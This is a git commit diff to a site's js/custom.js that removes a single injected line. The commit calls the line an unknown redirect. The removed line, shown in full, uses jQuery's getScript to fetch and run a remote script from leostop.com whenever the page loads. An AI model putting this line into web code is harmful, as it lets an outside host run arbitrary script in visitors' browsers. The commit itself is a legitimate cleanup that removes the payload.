4612e915949cf33791bcef28bbac17c187282533
Tari <65512380+Tari-dev@users.noreply.github.com>
2022-02-21 12:22:03 +0530

    Remove leocode's (unknown) redirect

--- js/custom.js
+++ js/custom.js
@@ -38,8 +38,6 @@ $(function () {
 	
 	
 	
-     function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-	
 	
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
